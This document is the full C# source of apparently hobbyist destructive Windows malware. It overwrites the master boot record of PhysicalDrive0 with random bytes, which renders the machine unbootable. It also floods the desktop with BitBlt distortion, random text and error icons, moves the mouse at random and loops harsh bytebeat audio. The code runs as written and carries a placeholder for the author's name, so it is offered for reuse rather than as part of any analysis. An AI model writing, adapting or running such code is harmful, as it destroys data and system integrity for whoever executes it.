using System;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;

public class MasonBitBlt
{
    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("gdi32.dll")]
    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(uint crColor);
    [DllImport("gdi32.dll")]
    private static extern bool DeleteObject(IntPtr hObject);
    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")]
    private static extern bool SetCursorPos(int X, int Y);
    private const uint SRCCOPY = 0x00CC0020;
    private const int MBR_SIZE = 512;
    private static void DrawIcons(Graphics g)
    {
        Icon errorIcon = SystemIcons.Error; 
        Icon alertIcon = SystemIcons.Warning;
        Random random = new Random();
        int screenW = GetSystemMetrics(0);
        int screenH = GetSystemMetrics(1);
        g.DrawIcon(errorIcon, random.Next(0, screenW - 64), random.Next(0, screenH - 64));
        g.DrawIcon(alertIcon, random.Next(0, screenW - 64), random.Next(0, screenH - 64));
    }
    private static void SEffect()
    {
        int screenW = GetSystemMetrics(0);
        int screenH = GetSystemMetrics(1);
        Random random = new Random();

        while (true)
        {
            IntPtr desktopHdc = GetDC(IntPtr.Zero);
            if (desktopHdc != IntPtr.Zero)
            {
                uint color = (uint)(random.Next(256) << 16 | random.Next(256) << 8 | random.Next(256));
                IntPtr brush = CreateSolidBrush(color);
                if (brush != IntPtr.Zero)
                {
                    using (Graphics g = Graphics.FromHdc(desktopHdc))
                    {
                        Font font = new Font("Impact", // Font
                            84, // Font Size
                            FontStyle.Bold);
                        Brush textBrush = new SolidBrush(Color.FromArgb((int)(color >> 16 & 0xFF), (int)(color >> 8 & 0xFF), (int)(color & 0xFF)));
                        g.DrawString("ABOLHB", // Enter Your Name
                            font, textBrush, random.Next(0, screenW - 100), random.Next(0, screenH - 50));

                        DrawIcons(g);
                    }
                    DeleteObject(brush);
                }

                ReleaseDC(IntPtr.Zero, desktopHdc);
            }
            Thread.Sleep(5);
        }
    }
    private static void PerformBitBlt()
    {
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        Random random = new Random();

        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            if (hdc != IntPtr.Zero)
            {
                BitBlt(hdc, random.Next(-20, 10), random.Next(-10, 20), sw, sh, hdc, 0, 0, SRCCOPY);
                BitBlt(hdc, random.Next(-20, 10), random.Next(-10, 20), sw, sh, hdc, 0, 0, 0x9273ecef);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }
    }
    private static void MasonMBR()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[MBR_SIZE];
            Random rand = new Random();
            rand.NextBytes(mbrData);
            fs.Write(mbrData, 0, MBR_SIZE);
        }
    }
    private static void MoveMouseRandomly()
    {
        Random random = new Random();
        int screenW = GetSystemMetrics(0);
        int screenH = GetSystemMetrics(1);

        while (true)
        {
            int x = random.Next(0, screenW);
            int y = random.Next(0, screenH);
            SetCursorPos(x, y);
            Thread.Sleep(500);
        }
    }
    public static void Main()
    {
        Thread MBRThread = new Thread(MasonMBR);
        MBRThread.IsBackground = true;
        MBRThread.Start();

        Thread effectThread = new Thread(SEffect);
        effectThread.IsBackground = true;
        effectThread.Start();

        Thread bitbltThread = new Thread(PerformBitBlt);
        bitbltThread.IsBackground = true;
        bitbltThread.Start();

        Thread mouseThread = new Thread(MoveMouseRandomly);
        mouseThread.IsBackground = true;
        mouseThread.Start();

        Thread byteBeatThread = new Thread(ByteBeat.PlayBytebeatAudio);
        byteBeatThread.IsBackground = true;
        byteBeatThread.Start();

        while (true)
        {
          Thread.Sleep(5);
        }
    }
}
class ByteBeat
{
    private const int SampleRate = 1400;
    private const int DurationSeconds = 64;
    private const int BufferSize = SampleRate * DurationSeconds;
    private static Func<int, int>[] formulas = new Func<int, int>[] {
t => (t * t >> 99) | (t >> 99) ^ (t >> 99) ^ (t * 99),
    };
    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }
    private static byte[] GenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }
    private static void SaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(SampleRate);
            bw.Write(SampleRate);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }
    private static void PlayBuffer(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        SaveWav(buffer, tempFilePath);
        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlaySync();
        }
        File.Delete(tempFilePath);
    }
    public static void PlayBytebeatAudio()
    {
        while (true)
        {
            foreach (var formula in Formulas)
            {
                byte[] buffer = GenerateBuffer(formula);
                PlayBuffer(buffer);
            }
        }
    }
}
